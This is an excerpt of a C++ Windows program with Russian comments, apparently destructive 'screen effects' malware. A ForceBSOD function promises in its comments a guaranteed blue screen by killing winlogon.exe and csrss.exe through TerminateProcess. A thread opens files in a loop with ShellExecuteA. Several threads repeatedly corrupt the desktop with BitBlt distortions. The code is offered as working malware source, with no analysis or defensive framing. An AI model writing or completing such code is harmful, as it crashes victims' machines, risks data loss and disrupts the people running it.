// raznos_ultimate_fixed.cpp - ПОЛНАЯ ВЕРСИЯ С ГАРАНТИРОВАННЫМ BSOD
...
volatile BOOL g_bStopThreads = FALSE;
...
// ==================== 100% BSOD ЧЕРЕЗ УБИЙСТВО КРИТИЧЕСКОГО ПРОЦЕССА ====================
...
VOID WINAPI ForceBSOD() {
    ...
    // Вариант 1: Убить winlogon.exe (критический процесс)
    ...
    // Вариант 2: Убить csrss.exe (ещё более критичный)
    pid = GetProcessIdByName("csrss.exe");
    if (pid) {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (hProcess) {
            TerminateProcess(hProcess, 0);
...
DWORD WINAPI exec_blitz(LPVOID lpvd) {
    ...
    while (!g_bStopThreads) {
        ...
        if (find != INVALID_HANDLE_VALUE) {
            ...
            while (FindNextFileA(find, &data) && !g_bStopThreads) {
                ShellExecuteA(0, "open", data.cFileName, 0, 0, SW_SHOW);
                Sleep(rand() % 5000);
            }
            FindClose(find);
        }
        if (g_bStopThreads) break;
...
DWORD WINAPI sine_rip(LPVOID lpvd) {
    ...
    while (!g_bStopThreads) {
        hdc = GetDC(0);
        for (float i = 0; i < sw + sh && !g_bStopThreads; i += 0.7f) {
            int a = (int)(sin(angle) * 400 + 200);
            BitBlt(hdc, 0, (int)i, sw, 1, hdc, a, (int)i, NOTSRCCOPY);
            BitBlt(hdc, 0, (int)i + 1, sw, 1, hdc, -a/2, (int)i + 1, SRCINVERT);
            angle += M_PI / 2.5;
        }
        ReleaseDC(0, hdc);
        Sleep(10);
...
DWORD WINAPI spin_blur(LPVOID lpvd) {
    ...
    while (!g_bStopThreads) {
        ...
        for (int y = 0; y < h && !g_bStopThreads; y += 2) {
            for (int x = 0; x < w && !g_bStopThreads; x += 2) {
                int dx = x - cx;
                int dy = y - cy;
...
DWORD WINAPI waterfall_shatter(LPVOID lpvd) {
    ...
    while (!g_bStopThreads) {
        hdc = GetDC(NULL);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < 80 && !g_bStopThreads; i++) {
            blocks[i][1] += 2 + rand() % 4;
...
DWORD WINAPI screen_explode(LPVOID lpvd) {
    ...
    while (!g_bStopThreads) {
        hdc = GetDC(NULL);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < 200 && !g_bStopThreads; i++) {
...
int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ...
    if (elapsed < TOTAL_EFFECTS_TIME) {
        Sleep(TOTAL_EFFECTS_TIME - elapsed);
    }
